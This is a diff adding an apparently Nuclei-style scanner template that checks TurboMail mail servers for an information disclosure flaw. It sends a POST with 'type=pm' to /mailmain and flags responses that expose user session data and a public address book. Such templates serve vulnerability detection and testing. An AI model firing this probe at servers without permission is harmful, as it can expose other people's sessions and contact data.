@@ -1,0 +1,28 @@
+id: TurboMail-mailmain-Information-disclosure
+
+info:
+  name: TurboMail mailmain 信息泄露漏洞
+  author: TurboMail
+  severity: high
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        POST /mailmain HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        type=pm
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ht_usersession user:'
+          - 'sessions:'
+          - 'm_cmPublicAddrBook'
+        condition: and
+      - type: status
+        status: 
+          - 200
